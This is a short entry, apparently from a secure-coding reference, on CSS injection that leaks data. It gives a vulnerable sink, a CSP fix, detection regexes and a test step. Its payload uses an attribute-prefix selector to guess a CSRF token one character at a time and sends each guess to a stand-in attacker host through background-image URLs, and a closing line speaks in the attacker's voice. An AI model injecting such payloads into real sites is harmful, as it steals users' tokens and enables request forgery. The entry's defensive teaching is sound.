---
order: 10
cwe: 200
owasp: A01
title: CSS exfiltration
category: injection
severity: medium
sink: |-
    style.textContent = `.profile { ${user.css} }`
payload: |-
    html:has(input[name=csrf][value^="a"]) {
      background: url(//evil.sh?c=a);
    }
fix: |
    Content-Security-Policy: style-src 'self'; img-src 'self'
detect:
    - 'style\.textContent\s*='
    - 'insertRule\('
    - ":style="
    - '<style>\{'
verify: "Inject `* { background: url(//your-server.example/ping) }`; a request to your server means the CSS reaches out."
fineWhen: "The CSS is built only from constants, or the CSP blocks inline styles and outside image requests."
refs:
    - https://portswigger.net/research/blind-css-exfiltration
---

No script needed. One rule per guessed character, and your CSRF token walks out to me through background requests.
